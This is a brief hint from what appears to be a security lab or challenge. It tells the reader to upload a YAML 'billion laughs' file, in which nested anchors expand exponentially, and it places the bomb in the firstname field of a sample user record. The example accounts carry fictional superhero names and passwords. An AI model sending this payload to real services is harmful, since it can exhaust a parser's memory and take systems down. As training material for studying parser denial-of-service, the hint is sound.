# Hint 3
create a yaml file similar to this and try to upload it

```yaml
lol1: &lol1 ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
lol2: &lol2 [*lol1,*lol1,*lol1,*lol1,*lol1,*lol1,*lol1,*lol1,*lol1]
lol3: &lol3 [*lol2,*lol2,*lol2,*lol2,*lol2,*lol2,*lol2,*lol2,*lol2]
lol4: &lol4 [*lol3,*lol3,*lol3,*lol3,*lol3,*lol3,*lol3,*lol3,*lol3]
lol5: &lol5 [*lol4,*lol4,*lol4,*lol4,*lol4,*lol4,*lol4,*lol4,*lol4]
lol6: &lol6 [*lol5,*lol5,*lol5,*lol5,*lol5,*lol5,*lol5,*lol5,*lol5]
lol7: &lol7 [*lol6,*lol6,*lol6,*lol6,*lol6,*lol6,*lol6,*lol6,*lol6]
lol8: &lol8 [*lol7,*lol7,*lol7,*lol7,*lol7,*lol7,*lol7,*lol7,*lol7]
lol9: &lol9 [*lol8,*lol8,*lol8,*lol8,*lol8,*lol8,*lol8,*lol8,*lol8]
lolz: &lolz [*lol9]
user:
  -
    firstname: Matt
    lastname: Murdock
    username: Daredevil
    password: BlindFighter
    comment: "Lives in Hell's Kitchen NYC and is blind."
  -
    firstname: *lolz
    lastname: Grayson
    username: Robin
    password: boyWonder
    comment: "The junior counterpart of Batman"
```